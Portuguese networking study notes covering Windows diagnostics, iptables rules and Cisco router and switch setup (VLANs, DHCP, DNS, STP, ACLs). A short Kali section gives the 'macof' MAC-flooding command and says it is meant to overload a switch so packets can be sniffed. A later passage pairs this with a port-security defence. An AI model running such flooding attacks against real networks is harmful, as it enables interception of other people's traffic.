$ ping       => Verifica a conectividade no nível de IP para outro computador TCP/IP enviando mensagens de solicitação de eco do Protocolo ICMP. O recebimento de mensagens de resposta de eco correspondentes é exibido, juntamente com os tempos de ida e volta. 
$ ipconfig   => Exibe todos os valores atuais de configuração de rede TCP/IP e atualiza as configurações de protocolo DHCP e DNS (sistema de nomes de domínio). Usado sem parâmetros, o ipconfig exibe endereços IPv4 (protocolo IP versão 4) e IPv6, máscara de sub-rede e gateway padrão para todos os adaptadores.
                TTL: O TTL seria uma informação dentro do pacote do IP que informa qual é a máxima quantidade de hops que minha informação pode passar antes de ser descartada. É a quantidade de máquinas que ela vai poder passar no caminho.
$ ipconfig /all => Exibe mais informações, inclusive o número de série da minha placa de Rede (MAC ou Endereço Físico) usado no protocolo ARP do aparelho Switch
$ tracert -d    => O traceroute seria usado para verificar a rota que minha informação percorreu até chegar o destino. (traceroute -n no linux)
                Output: "*" Quando nós temos uma máquina que retornou (*) e passou a informação para uma próxima máquina, isso provavelmente indica que o administrador dessa máquina desabilitou a resposta ao nosso chamado. O que acontece seria que esse tipo de teste pode ser interpretado como uma tentativa de “scanear” possíveis portas abertas e vulnerabilidades que possam existir, caso seja usado por um usuário malicioso, pode ser usada como uma forma de reconhecimento da rede dessa possível vítima para que assim possa explorar possíveis falhas.
$ nslookup          => Exibe informações que você pode usar para diagnosticar a infraestrutura do DNS (Sistema de Nomes de Domínio). Antes de usar essa ferramenta, você deve estar familiarizado com o trabalho do DNS. A ferramenta de linha de comando nslookup estará disponível somente se você tiver instalado o protocolo TCP/IP.
$ ping 127.0.0.1 || ping localhost => É um endereço interno da placa de rede, usado para testar se os protocolos TCP/IP estão funcionando. Ele é conhecido como endereço de loopback, pois o sinal é enviado e recebido por ele mesmo.
$ netstat           => ver netstat --help


=========== kali-linux ==================================================================================================================
$ macof -i eth0     => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
$ arp -a            => Ver quais endereços MAC estão salvos para serem usados pelo ARP
=========================================================================================================================================

=========== iptables ====================================================================================================================
!Um alternativa ao firewall pfSense, o iptables já vem instalado no Kernel do Linux
$ systemctl status iptables.service  => Verifica os status do Ip Tables
$ systemctl stop iptables.service    => Desativa o firewall
$ systemctl start iptables.service   => Ativa o firewall
$ iptables -L -n    => O iptables é um programa escrito em C, utilizado como ferramenta que configura regras para o protocolo de internet IPv4 na tabela de filtragem de pacotes, utilizando os módulos e framework do kernel Linux. Com -L nós listamos as regras criadas. Iptables trabalha com 3 tabelas: INPUT: para os dados que chegam ao servidor. OUTPUT: para os dados que saem do servidor. FORWARD: para os dados que passam pelo servidor.  
$ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT => geralmente a primeira regra que deve ser colocada no firewall. Quando um pacote chega até o iptables, e tem o seu acesso concedido, o firewall coloca isso em memória. Logo, ele sabe que a origem "A" está falando com o servidor "B", e fica com essa tabela em memória, para ele poder se referenciar a essa conexão. Então algumas tabelas ficam em memória. Esta regra é criada, para que tudo o que foi aceito, tudo o que está conectado, ou seja, uma vez foi permitido, deixamos passar. Se essa for a primeira regra, também economizaremos recursos do firewall. Assim, se uma nova conexão HTTP chega ao servidor, por exemplo, ela não precisará ir até a regra da porta HTTP do firewall, já que se houver uma conexão pronta em memória, a conexão será aceita.
$ iptables -A INPUT -i lo -j ACCEPT     =>  (!importante) Isso permite a conexão de diferentes serviços que estão rodando na minha máquina. Partindo do princípio que tudo está funcionando na mesma máquina (servidor web, banco de dados, entre outras aplicações), quando o servidor web consulta o banco de dados, por exemplo, qual é o IP de origem? Não é o IP associado à interface ethernet, e sim o IP da interface loopback. Por isso passamos a flag -i (de interface) e especificamos o campo lo (de loopback). Se não houver uma regra desse tipo no firewall, as conexões internas na mesma máquina não irão funcionar.
$ iptables -A NOME_DA_CHAIN -p PROTOCOLO -s ENDEREÇO_DE_ORIGEM -d ENDEREÇO_DE_DESTINO --dport PORTA_DE_DESTINO -j AÇÃO_DA_REGRA => Definindo uma regra pelo iptables ex: iptables -A INPUT -p tcp -s 0.0.0.0/0 -d 138.197.34.9 --dport 80 -j ACCEPT // iptables -A INPUT -p tcp --dport 443 -j ACCEPT // iptables -A INPUT -p tcp -d IP_SERVIDOR --dport 22 -j ACCEPT // iptables -i INPUT 5 -p tcp -d IP_SERVIDOR --dport 22 -j LOG (Como as regras são processadas sequencialmente, é necessário criar primeiro a regra tipo LOG e depois a regra em questão. Caso essa ordem seja invertida, não haverá pacotes a serem logados, uma vez que eles já encaixaram na regra anterior.)
$ iptables -i INPUT 1 -p tcp --dport http -j ACCEPT  => -i para adicionar a regra na posição que desejar, neste caso na posição 1 (INPUT 1). Isso ajuda a economizar processamento, pois estamos colocando as regras mais importantes primeiro, para que sejam processadas primeiro.     
$ iptables -P INPUT DROP     => O ideal é só aceitarmos o que deixamos explícito nas regras, se o pacote não encaixar em nenhuma delas, ele deve ser descartado. Vamos então mudar a política do iptables. Bem simples. Utilizamos a flag -P para especificar que estamos alterando a policy da chain INPUT para DROP.
$ iptables -D INPUT 1  => Para excluir somente uma regra. Utilizamos o flag -D para especificar que queremos excluir uma regra. Em seguida dizemos em que chain a regra a ser excluída se encontra, e passamos o número dela, o número 1 representa que a regra é a primeira da lista, da chain INPUT.
$ iptables -F   => limpar todas as regras do ip tables
$ iptables-save > regras-firewall => Já vimos como criar as regras, mas ainda não sabemos como salvá-las, então se o servidor acabar sendo desligado ou reiniciado, as mesmas são perdidas. Como o iptables-save nos retorna tudo o que está rodando na memória, podemos salvar esse conteúdo em um arquivo
$ iptables-restore < regras-firewall => Agora o arquivo regras-firewall possui todas as nossas regras criadas, que são as regras a serem aplicadas no firewall. Assim como salvamos as regras, podemos restaurá-las, através de outra ferramenta, a iptables-restore
$ sudo apt-get install iptables-persistent => Para usuários de sistemas baseados no Debian, há um pacote que nos auxilia nesse processo, iptables-persistent. Esse pacote, quando instalado, criará o arquivo rules.v4, dentro do diretório /etc/iptables/. Esse arquivo basicamente possui como conteúdo o retorno do comando iptables-save, e ao reiniciarmos o servidor, ele será automaticamente carregado, colocando as regras em memória. Caso criemos uma nova regra, basta refazermos o arquivo: $ iptables-save > /etc/iptables/rules.v4
Ver: https://www.alura.com.br/artigos/protegendo-seu-servidor-com-iptables
     https://www.youtube.com/watch?v=oZ36N2KhqHY&ab_channel=Hack3r         => Ataque feito burlando o iptables com conexão reversa
=========================================================================================================================================


=========== Conteúdo de Redes/Segurança e configuração de aparelhos CISCO ===============================================================
=> https://www.alura.com.br/artigos/como-armazenar-senhas-no-banco-de-dados-de-forma-segura
   https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
   https://www.alura.com.br/artigos/autenticacao-de-forma-segura-com-criptografia
   

!IP: O termo IP (Internet Protocol) é um número identificador dado ao seu computador, ou roteador, ao conectar-se à rede. É através desse número que seu computador pode enviar e receber dados na internet. O IP é definido pelo seu provedor de Internet. Ele pode ser estático (não mudar) ou dinâmico (mudando de tempos em tempos).
!Classes do IP: ver imagem. A IETF (Internet Engineering Task Force) determinou que existiriam ao todo 5 classes de endereços IP, indo de ordem alfabética da classe A até a classe E. Porém as duas últimas classes não são usadas para serem endereçadas as máquinas. A classe D seria usada para multicast (termo usado quando queremos nos comunicar com somente algumas máquinas de nossa rede) e a classe E seria uma classe experimental. Portanto as classes de IP que podem ser endereçadas para máquinas seriam a classe A, B e C.
!IP Privado: Os endereços internos privados não são roteados na Internet e nenhum tráfego pode ser enviado a eles da Internet, eles apenas deveriam funcionar dentro da rede local.Esses são endereços IP reservados. Esses endereços são destinados ao uso em redes locais fechadas e a alocação de tais endereços não é controlada globalmente por ninguém.O acesso direto à Internet usando um endereço IP privado não é possível. Nesse caso, a conexão com a Internet é via NAT (a tradução do endereço de rede substitui o endereço IP privado por um público). Os endereços IP privados na mesma rede local devem ser exclusivos e não podem ser repetidos.
       * Note que o IP da minha máquina é um IP Privado, estão, para acessarmos a internet a nossa provedora nos dá um ip público que pode ser visto no site: https://meuip.com.br/
!IP Público: São endereços públicos globais usados na Internet. Um endereço IP público é um endereço IP usado para acessar a Internet. Os endereços IP públicos (globais) são roteados na Internet, ao contrário dos endereços privados. A presença de um endereço IP público em seu roteador ou computador permitirá que você organize seu próprio servidor (VPN, FTP, WEB, etc.), acesso remoto ao seu computador, câmeras de vigilância de vídeo e acesse-os de qualquer lugar da rede global. Com um endereço IP público, você pode configurar qualquer servidor doméstico para publicá-lo na Internet: Web (HTTP), VPN (PPTP / IPSec / OpenVPN), mídia (áudio / vídeo), FTP, unidade de rede NAS, servidor de jogos, etc.
       * Pode ser visto em: https://meuip.com.br/
!Wireshark: https://www.wireshark.org/  - Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.
       *ip.addr==algum_ip   => para filtrar no wireshark
!TCP: Protocolo de Controle de Transmissão (do inglês: Transmission Control Protocol, abreviado TCP) é um dos protocolos de comunicação, da camada de transporte da rede de computadores do Modelo OSI, que dão suporte a rede global Internet, verificando se os dados são enviados na sequência correta e sem erros via rede. É complementado pelo protocolo da Internet, normalmente chamado de, TCP/IP. Neste protocolo da camada de transporte (camada 4 OSI) se assentam a maioria das aplicações cibernéticas, como o SSH, FTP, HTTP — portanto, a World Wide Web,[1] devido sua versatilidade e robustez. O Protocolo de controle de transmissão provê confiabilidade, entrega na sequência correta e verificação de erros dos pacotes de dados, entre os diferentes nós da rede, para a camada de aplicação. Aplicações que não requerem um serviço de confiabilidade de entrega de pacotes podem se utilizar de protocolos mais simples como o User Datagram Protocol (UDP), que provê um serviço que enfatiza a redução de latência da conexão. //// O protocolo TCP encontra-se acima da camada onde o IP está localizado e ele é responsável por realizar o transporte da minha informação. Além do protocolo TCP, essa camada possui também outro protocolo bastante conhecido, o UDP.
!ICMP: ICMP, sigla para o inglês Internet Control Message Protocol (em português, Protocolo de Mensagens de Controle da Internet), é um protocolo integrante do Protocolo IP, definido pelo RFC 792, é utilizado para comunicar informações da camada de rede, sendo o uso mais comum para fornecer relatórios de erros à fonte original. Qualquer computador que utilize IP precisa aceitar as mensagens ICMP e alterar o seu comportamento de acordo com o erro relatado. Os gateways devem estar programados para enviar mensagens ICMP quando receberem datagramas que provoquem algum erro.
!ARP: O ARP é o protocolo utilizado para fazer o mapeamento entre o endereço IP e o endereço MAC de um dispositivo. Isso é necessário porque o MAC encontra-se um nível abaixo do IP e eu preciso dele para poder transmitir as informações. Em redes de computadores, temos protocolos que possuem hierarquias diferentes. Para poder chegar até o IP que está na camada 3, eu preciso passar pelo MAC que está na camada 2, pense como se fosse escalar uma pirâmide, não dá pra chegar ao topo sem passar pelo meio dela!
!TLS: (Transport Layer Security) seria um protocolo de criptografia utilizado para segurança da informação (usado no HTTPS). Ele seria a evolução do protocolo SSL (Secure Sockets Layer).
!T568A: Padrão para o cabo de internet, desenvolvido pela associação internacional de Telecomunicações (Telecomunication industry association - TIA). Eles definiram o padrão de cores que deveria ser seguido. O T568B, utlizado na outra ponta do cabo, tem os cabos invertidos para fazer corretamente a passaem de entrada e saída de dados de uma máquina para outra, informaçoes estão na imagem salva nesta pasta
       T568A ordem: Branco e verde, verde, branco e laranja, azul, branco e azul, laranja, branco e marrom, marrom
	  T568B ordem: Branco e laranja, laranja, branco e verde, azul, branco e azul, verde, branco e marrom, marrom
       *As placas de rede dos computadores transmitem, por padrão, nas posições 1 e 2. As placas de rede dos computadores recebem por padrão nas posições 3 e 6. As placas de rede dos hubs transmitem por padrão nas posições 3 e 6. As placas de rede dos hubs recebem por padrão nas posições 1 e 2.
       *Se tentarmos fazer a conexão de dois computadores com cabo direto e conseguirmos pingar a máquina, provavelmente as placas de rede possuem um padrão auto-MDIX que é capaz de detectar que colocamos um cabo “errado”, mas consegue realizar a correção das polaridades via software 
!Hub: Aparelho que permite fazer a conexão de rede com várias máquinas https://www.google.com/search?q=ethernet+hub&sxsrf=APq-WBva_gdk-gLwFgRs6xiklwWP5SIz4A:1645466536375&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj8p4_DsJH2AhWHEbkGHY5EBMUQ_AUoAnoECAEQBA&biw=1536&bih=764&dpr=1.25
       * Uma das limitações do hub: ele não consegue aprender aonde os computadores estão interconectados e sempre passará as informações para todos os dispositivos conectados com a porta, com exceção de quem enviou a requisição (exemplo quando uso o comando ping). O nome disso é Broadcast. Imagine um usuário fazendo o download de 500 mb e todos os dispositivos recebendo essa informação... Causa uma lentidão na rede. Em relação ao hub, precisamos falar também sobre a segurança da informação. A requisição que fizemos entre o segundo computador e o laptop, o hub desconhece aonde está conectado o laptop. Logo, ele enviará para todos os dispositivos que estiverem conectados. Se uma das máquinas tiver um usuário malicioso, ele pode fazer o que chamamos de análise de protocolo e decifrar o que está sendo enviado pelo segundo computador. O hub representa uma lentidão, além da vulnerabilidade da segurança.
!Roteador: A função do roteador é interconectar redes encaminhando seus pacotes de dados, os Switches e hubs são usados somente para conexão na minha rede local.
       * Para conectar um computador com um roteador, uso um cabo cruzado (CISCO CABO CONSOLE RJ45 PARA DB9), e usamos o app PUTTY para acessá-lo
       * cofigurando Roteador na aba cli:
         $ ?                        => mostra algumas informações
         $ wr                       => para salvar todas as configurações do roteador, ou seja, passar da memória volátil para a não volátil
         $ show running-config      => mostrando tudo oq está configurado
         $ show ip route            => ver a tabela com todas as rodas que o roteador possui
         $ ip route <ip> <ip_mask> <interface> => definir uma rota  ex: ip route 150.1.1.8 255.255.255.252 serial 0/1/0
         $ enable      => para subir em privilégio administrativo
         $ configure terminal => para entrar no modo de configuração do roteador
         $ interface fastEthernet 0/0 => para começar a configurar uma porta do roteador
         $ no shutdown                => agora a porta estará habilitada e acesa na cor verde
         $ exit                       => sair das configurações dessa porta
         $ interface fastEthernet 0/1 => para entrar nas configurações da outra porta
         $ no shutdown                => agora a porta estará habilitada e acesa em verde
         $ ip address 192.168.3.5 255.255.255.0 => como não temos um aparelho DHCP vamos dar um ip manualmente (192.168.3.5 = gateway) e informar a máscara de rede
         $ CTRL + Z                   => sair da configuração
         $ ping 192.168.3.2           => verificar se a conexão foi feita com sucesso com a máquina da porta 0/1
         $ configure terminal => para entrar no modo de configuração do roteador
         $ interface fastEthernet 0/0 => para começar a configurar uma porta do roteador
         $ ip address 191.168.3.7 255.255.255.0 => (191.168.3.7 = gateway) Lembrando que temos que configuras o roteador e o computador na mesma rede nessa porta, por isso obedecer a máscara de rede
         $ CTRL + Z                   => sair da configuração
         $ ping 191.168.3.1           => verificar se a conexão foi feita com sucesso com a máquina da porta 0/0, agora temos a conexão das duas portas feitas        
         $ show ip interface brief    => ver meus gateways configurados
         Ir em config do PC1 e colocar o seu gateway => 191.168.3.7
         Ir em config do PC2 e colocar o seu gateway => 192.168.3.5
         No PC1 $ ping 192.168.3.2    => Agora meu PC1 consegue se comunicar com o PC2 que está em uma rede diferente da dele
         No PC2 $ ping 191.168.3.1    => Agora meu PC2 consegue se comunicar com o PC1 que está em uma rede diferente da dele
!Switch: Veio como um substituto aos Hubs, por ser mais seguro (O Hub não consegue aprender onde um equipamento está localizado, o Switch sim). Quando um dispositivo quer se comunicar com outro, ele vai necessitar passar pelo Switch e ele informa dentro do pacote qual é seu endereço MAC e o Switch grava essa informação em sua memória, para que não tenha que "vazar" a informação para outros computadores que não seja o que enviou a informação e está esperando a resposta, uma vez que ele salvou o endereço dele e sabe para quem devolver. 
       * Uma das limitações do switch: Métodos usados por usuários maliciosos seria de inserir vários endereços MAC falsos para “lotar” a memória do Switch, uma vez que a memória esteja cheia, o Switch não vai conseguir definir quem está onde e ele passa a atuar como um Hub. Para contornar esse risco, podemos configurar a porta do Switch para aceitar um número máximo de endereços MAC, ao ultrapassar esse limite a porta é desligada e o ataque não teria sucesso.
       * O protocolo STP é utilizado pelos Switches como uma forma de prevenir que loops aconteçam em nossas redes.
       * O endereço FF-FF-FF-FF-FF-FF será interpretado como sendo um endereço broadcast e será passado para todas as portas do Switch com exceção da porta a qual enviou essa informação
       * No caso de todos os Switches estarem configurados com a prioridade padrão 32.768. Qual será o critério que o protocolo do STP irá adotar para eleger o Switch Root? Uma vez que as prioridades do Switch estiverem configuradas com o mesmo valor padrão, o Switch Root será o Switch que tiver o menor endereço MAC. A porta root seria a porta que os outros Switches definiram como sendo a melhor porta de acesso ao Switch Root. Os modos de operação das portas do Switch Root seriam no modo Designado.
       * A análise que o protocolo STP realiza para eleger o Switch Root seria através dos valores de prioridade e endereço MAC presentes dentro do protocolo BPDU. Esse conjunto de valores de prioridade e endereço MAC é conhecido como Bridge-ID. O primeiro critério que o STP irá analisar será o valor de prioridade, o Switch que apresentar menor prioridade será eleito como Root. Caso ocorra um empate entre as prioridades, o Switch irá analisar os endereços MAC e o que apresentar o menor endereço MAC é que será eleito como Root.
         $ show mac-adrress-table => ver todos os endereços MAC salvos na memória
       * Evitando ataque de lotação de memória com endereços MAC:
         $ configure terminal
         $ interface fa0/2
         $ switchport mode access
         $ switchport port-security mac-address 00E0.B0AE.A127 => com isso habilitamos somente um endereço MAC nesta porta, caso um novo computador tente enviar informações a porta será desligada.
         $ show port-security interface fa0/2
         $ 
!VLAN no Switch:
       * Uma rede local virtual, normalmente denominada de VLAN, é uma rede logicamente independente. Várias VLANs podem coexistir em um mesmo comutador, de forma a dividir uma rede local em mais de uma rede, criando domínios de broadcast separados
       * As Vlans (Virtual Lans) são usadas para segmentação de redes e priorização de tráfego. Hoje em dia as redes corporativas trafegam diferentes tipos de dados em suas redes, como por exemplo, podemos ter tráfego de dados, vídeo e voz e acaba sendo necessário lidar com esses diferentes tipos de tráfego de uma maneira a priorizar um sobre o outro.
         $ ?                    => mostra algumas informações
         $ enable               => para subir em privilégio administrativo
         $ show vlan brief      => mostra todos os números de vlan sendo utilizadas 1-1005, usar apenas números livres
         $ configure terminal   => para entrar no modo de configuração do switch
         $ vlan 10              => colocamos o número da vlan que queremos configurar
         $ name VENDAS          => seguimentar as vlans por setor da empresa, por isso vamos nomeá-la
         $ exit                       => sair das configurações dessa vlan
         $ CTRL + Z                   => sair da configuração
         $ show vlan brief            => vemos que ela foi adicionada, mas ainda não tem interfaces
         $ configure terminal   => para entrar no modo de configuração do switch
         $ interface range fastEthernet 0/1 - 2 => com range podemos configurar mais de uma porta do switch de uma só vez
         $ switchport mode access     => O comando switchport mode access indicaria que essa porta está conectada a um dispositivo final
         $ switchport access vlan 10  => definir qual vlan essa porta está associada
         $ exit                       => sair das configurações dessa vlan
         $ CTRL + Z                   => sair da configuração
         $ show vlan brief            => agora vemos que a vlan de vendas está associada as portas 0/1 e 0/2
!Portas Trunk:
       * As portas trunk são portas configuradas para realizar o transporte de múltiplas Vlans entre Switches ou entre Switches e roteadores:
         $ enable               => para subir em privilégio administrativo
         $ show vlan brief      => mostra todos os números de vlan sendo utilizadas 1-1005, usar apenas números livres
         $ configure terminal   => para entrar no modo de configuração do switch
         $ interface range fastEthernet 0/3 => porta que iremos configurar em modo trunk
         $ switchport mode trunk            => definindo a porta em modo trunk
         $ CTRL + Z                         => sair da configuração
         $ show interfaces trunk            => mostra as portas que estão trabalhando em modo trunk e quais números de vlan elas passam
!Comunicação entre duas vlans atraves do roteador e configurando o DHCP:
       * no switch
         $ enable  
         $ configure terminal                   
         $ interface fastEthernet 0/5           
         $ switchport mode trunk                
         $ show interfaces trunk
       * no roteador
         $ enable                     => para subir em privilégio administrativo
         $ configure terminal         => para entrar no modo de configuração do roteador
         $ interface fastEthernet 0/1 => para começar a configurar uma porta do roteador
         $ no shutdown                => agora a porta estará habilitada e acesa em verde
         $ CTRL + Z                   => sair da configuração
         $ ip dhcp pool VLAN10          => O conjunto de endereços IP disponíveis, já descontados os endereços das faixas de exelusão, é conhecido como Pool de endereços.
         $ network 192.168.10.0 255.255.255.0  => definir o endereço de rede e máscara de rede
         $ exit          
         $ ip dhcp pool VLAN20                 => O conjunto de endereços IP disponíveis, já descontados os endereços das faixas de exelusão, é conhecido como Pool de endereços.
         $ network 192.168.20.0 255.255.255.0  => definir o endereço de rede e máscara de rede
         $ exit
         $ interface fastEthernet 0/1.1        => vamos dividir a fasEthernet em duas sub interfaces, uma para a Vlan10 e outra para a 20 
         $ encapsulation dot1Q 10              =>
         $ ip address 192.168.10.1 255.255.255.0  => definindo um ip para essa sub rede
         $ exit 
         $ interface fastEthernet 0/1.2        => vamos dividir a fasEthernet em duas sub interfaces, uma para a Vlan10 e outra para a 20
         $ encapsulation dot1Q 20
         $ ip address 192.168.20.1 255.255.255.0  =>  definindo um ip para essa sub rede
         $ exit 
         $ ip dhcp pool VLAN10
         $ default-router 192.168.10.1         => DHCP gateway
         $ exit 
         $ ip dhcp pool VLAN20
         $ default-router 192.168.20.1         => DHCP gateway               
         $ exit                        
!DHCP: O protocolo DHCP é um protocolo de cliente/servidor que fornece automaticamente um host ip (protocolo IP) com seu endereço IP e outras informações de configuração relacionadas, como a máscara de sub-rede e o gateway padrão.
       * cofigurando Roteador na aba cli:
         $ enable                      => para subir em privilégio administrativo
         $ configure terminal          => para entrar no modo de configuração do roteador
         $ interface fastEthernet 0/0  => para começar a configurar uma porta do roteador
         $ no shutdown                 => agora a porta estará habilitada e acesa em verde
         $ exit                        => sair das configurações dessa porta
         $ ip dhcp pool ALURA          => O conjunto de endereços IP disponíveis, já descontados os endereços das faixas de exelusão, é conhecido como Pool de endereços.
         $ network 192.168.0.0 255.255.255.0  => definir o endereço de rede e máscara de rede
         $ default-router 192.168.0.1  => definir um gateway padrão para todas as máquinas conectadas a essa rede
         $ exit
         $ interface fastEthernet 0/0  => Para configurarmos a porta 0/0 do roteador
         $ ip address 192.168.0.1 255.255.255.0     => Definir o IP dessa porta 0/0 que como já informamos antes servirá como gateway
	    Ir na aba Descktop de cada computador e mudar de Static para DHCP
       * Quando um cliente não possui endereço IP ele não sabe a quem perguntar, então ele precisa sair perguntando para todo mundo que está na mesma rede quem poderá fornecer um endereço IP. Quando essa comunicação é feita para todos os dispositivos, chamamos isso de Broadcast.
!Servidor web: Referente ao hardware, um servidor web é um computador que armazena arquivos que compõem os sites (por exemplo, documentos HTML, imagens, folhas de estilo, e arquivos JavaScript) e os entrega para o dispositivo do usuário final. Está conectado a Internet e pode ser acessado através do seu nome de domínio (DNS), como por exemplo mozilla.org. Referente ao software, um servidor web inclui diversos componentes que controlam como os usuários acessam os arquivos hospedados (armazenados para disponibilização), no mínimo um servidor HTTP. Um servidor HTTP é um software que compreende URLs (endereços web) e HTTP (o protocolo que seu navegador utiliza para visualizar páginas web.
       * cofigurando Roteador na aba cli:
         $ enable                      => para subir em privilégio administrativo
         $ configure terminal          => para entrar no modo de configuração do roteador
         $ interface fastEthernet 0/1  => configurar a porta 0/1
         $ no shutdown                 => agora a porta estará habilitada e acesa em verde
         $ ip address 8.8.8.1 255.0.0.0
       * Agora ir no servidor:
         Em ip configuration > interface > static > ipv4 = 8.0.255.255 > Subnet mask = 255.0.0.0 > gateway > 8.8.8.1 
	 * Colocar um html para o projeto do google:
         Ir em Services > Http > indice 5 > edit > apagar tudo > 
										<html>
										<h1>GOOGLE</h1>
										<input type="search">
										<input type="button" value="Buscar">
										</html>
       * Agora ir em um dos PCs e em web digitar o ip do servidor: 8.0.255.255
!DNS: O sistema DNS da internet funciona praticamente como uma agenda de telefone ao gerenciar o mapeamento entre nomes e números. Os servidores DNS convertem solicitações de nomes em endereços IP, controlando qual servidor um usuário final alcançará quando digitar um nome de domínio no navegador da web.
       * No servidor DNS:
         Em ip configuration > interface > static > ipv4 = 8.1.0.0 > Subnet mask = 255.0.0.0 > gateway > 8.8.8.1
       * Fazer o DNS do ip do google:
         Ir em Services > DNS > dns service = on >  name = www.google.com > address = 8.0.255.255 > add
       * Ir no roteador DHCP para informarmos quem será o DNS (note que em ip configuration de cada máquina não tem um dns setado, o DHCP irá informar):
         $ enable                      => para subir em privilégio administrativo
         $ configure terminal          => para entrar no modo de configuração do roteador
         $ ip dhcp pool ALURA          => acessar o poll que criamos antes
         $ dns-server 8.1.0.0          => agora o DHCP sabe qual IP de DNS ele deve passar aos computadores
         Ir nos computadores e dar refresh mudando de Static para DHCP
       * O serviço web utiliza a porta de comunicação 80 para o protocolo HTTP e 443 para a versão segura do protocolo HTTP (HTTPS), enquanto que o protocolo DNS utiliza a porta de comunicação 53
!STP (Spanning tree protocol):
       * Spanning Tree Protocol (referido com o acrónimo STP) é um protocolo para equipamentos de rede que permite resolver problemas de loop em redes comutadas cuja topologia introduza anéis nas ligações, auxiliando na melhor performance da rede. O protocolo STP possibilita a inclusão de ligações redundantes entre os computadores, provendo caminhos alternativos no caso de falha de uma dessas ligações. Nesse contexto, ele serve para evitar a formação de loops entre os comutadores e permitir a ativação e desativação automática dos caminhos alternativos. Para isso, o algoritmo de Spanning Tree determina qual é o caminho mais eficiente (de menor custo) entre cada segmento separado por bridges ou switches. Caso ocorra um problema nesse caminho, o algoritmo irá recalcular, entre os existentes, o novo caminho mais eficiente, habilitando-o automaticamente.
         $ enable                      => para subir em privilégio administrativo
         $ show spanning-tree vlan 10  => mostra informações do switch root e do atual (bridge ID) 
         $ show spanning-tree vlan 20
         $ enable
         $ configure terminal
         $ spanning-tree vlan 10 priority 0 => para definir um switch como root da vlan 10 manualmente
         $ spanning-tree vlan 20 priority 0 => para definir um switch como root da vlan 20 manualmente
!Máscara de Rede: A máscara de rede é usada como forma de comparação para determinar se dois equipamentos estão na mesma rede. Para isso ela vai dividir o endereço IP em dois grupos, de rede e hosts (máquinas).
!Defaut gateway: O default gateway é o endereço IP o qual será responsável por encaminhar pacotes para redes externas, é o IP do meu roteador.
!Broadcast: Broadcast seria um termo usado quando a comunicação é feita para todos os dispositivos que estão na mesma rede.
!Vamos fazer agora a tradução do endereço IP de loopback para a url www.cursoderedesdaalura.com: Caso seja Windows: Abrir bloco de notas como administrador e abrir o arquivo hosts localizado em C:\Windows\System32\drivers\etc e insira na última linha o mapeamento 127.0.0.1 www.cursoderedesdaalura.com e teste o ping para essa url
!Para modificar o IP da minha máquina manualmente:  Vamos até no ícone de conectividade, depois em "configurações de rede", "Ethernet". Em seguida, clicaremos em "Ethernet", ao ser aberta uma nova janela, selecionaremos "Propriedades". Será aberta uma nova janela, buscaremos pela opção "Protocolo IP Versão 4(TCP/IPv4)", depois em "Propriedades". Na nova janela, selecionaremos "Usar o seguinte endereço IP" e escreveremos o IP que ele deverá usar para fazer o teste.
!Classful e Classless: Nas redes Classful utilizamos as máscaras de rede respectivas a sua classe de endereços IP. Já nas redes Classless não teríamos esse vínculo entre endereços IP e máscaras de redes, somos livres para ajustar a máscara de rede para nossa necessidade independente de qual classe estarmos usando.  (classful ex: 255.255.255.0 , classless ex: 255.255.254.0)
           * Devemos desenvolver um projeto e o arquiteto de redes do projeto que estamos desenvolvendo disse que todos os endereços IP devem possuir máscara de rede /19. Que máscara de rede seria essa? A anotação CIDR seria a referência de quantos bits 1 nós temos em nossa máscara de rede. A máscara de rede possui ao todo 32 bits sendo separados em quatro intervalos com 8 bits por intervalos. Teremos então: 11111111.11111111.11100000.00000000 Se nós transformarmos esse valor em decimal, teremos: 255.255.224.0 Embora a forma oficial de representação e configuração da máscara de rede para endereços IPv4 seja por essa forma decimal (255.255.224.0) é comum no dia-a-dia utilizar essa anotação CIDR (/19).
!ACL: Listas de acesso ou do inglês (ACL) são listas as quais contém políticas de permissão ou negação de acesso por parte de clientes. Dessa forma, conseguimos criar políticas por usuário de quais protocolos e serviços que podem ser utilizados
       * Uma vez que a lista de acesso não possui nenhuma configuração para tratamento de um pacote de informação, a lista irá descartar esse pacote. 
       * No roteador:
         $ enable                                     
         $ configure terminal                          
         $ ip access-list extended SERVIDOR-GERENTES  => Criando uma lista de acesso
         $ no ip access-list extended SERVIDOR-GERENTES  => Para excluir uma lista de acesso
         Retirar os ips de dinâmico para estático para não inutilizar a lista
         $ permit tcp 172.16.2.131 0.0.0.0 172.16.3.2 0.0.0.0 => informando o ip do computador que desejamos permiter acesso e o "Source wildcard bits" que seria para indicar para a lista de acesso qual parte do ip deve igual e qual a parte pode ser diferente, quando temos mais de um computador querendo se comunicar. Depois devemos colocar o ip de destino que no caso seria o servidor e também informar o "Source wildcard bits"
         $ permit tcp 172.16.0.2 0.0.0.0 172.16.3.2 0.0.0.0   => outro computador com permissão a este servidor
         $ deny tcp 172.16.2.128 0.0.0.255 172.16.3.2 0.0.0.0 => Isto quer dizer que se não for nenhum desses endereços (172.16.2.131 e 172.16.0.2), o pacotinho será negado! Feito isso, vamos permitir que os outros protocolos de comunicação trabalhem normalmente, sem que o ACL exclua o pacote e derrube a comunicação dos demais computadores
         $ deny tcp 172.16.0.0 0.0.0.255 172.16.3.2 0.0.0.0
         $ permit ip any any                                  => Com o #permit ip any any, estamos permitindo qualquer tráfego que não seja destinado ao servidor. Uma vez que estamos colocando any, isso indica que qualquer endereço IP de origem assim como qualquer endereço IP de destino será aceito. Essa configuração é comumente utilizada nas listas de acesso para permitir que todo tráfego que esteja fora do nosso foco da lista de acesso continue funcionando normalmente.
         $ exit
         $ ip dhcp excluded-address 172.16.2.131  => como estou usando estaticamente esses indereços ips eu preciso que o dhcp os exclua para que ele não acabe os entregando para outros computadores e cause conflito na rede
         $ ip dhcp excluded-address 172.16.0.2
         $ interface fastEthernet 0/1.1 
